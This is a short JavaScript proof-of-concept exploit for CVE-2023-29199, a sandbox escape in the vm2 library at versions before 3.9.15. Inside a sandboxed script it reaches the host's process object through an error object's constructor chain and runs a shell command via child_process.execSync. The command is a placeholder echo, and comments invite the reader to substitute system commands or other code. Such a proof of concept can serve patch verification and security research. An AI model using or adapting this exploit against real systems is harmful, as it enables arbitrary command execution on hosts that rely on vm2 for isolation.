//version<3.9.15
//https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-29199
//echo write malicious code in return process
//Modify the command string in the execSync function to execute system instructions
//modify 'return process' to execute other JavaScript code
const {VM} = require("vm2-3-9-15");
const vm = new VM();

const code = `
aVM2_INTERNAL_TMPNAME = {};
function stack() {
    new Error().stack;
    stack();
}
try {
    stack();
} catch (a$tmpname) {
    a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').execSync("echo write malicious code in return process").toString();
}
`

console.log(vm.run(code));
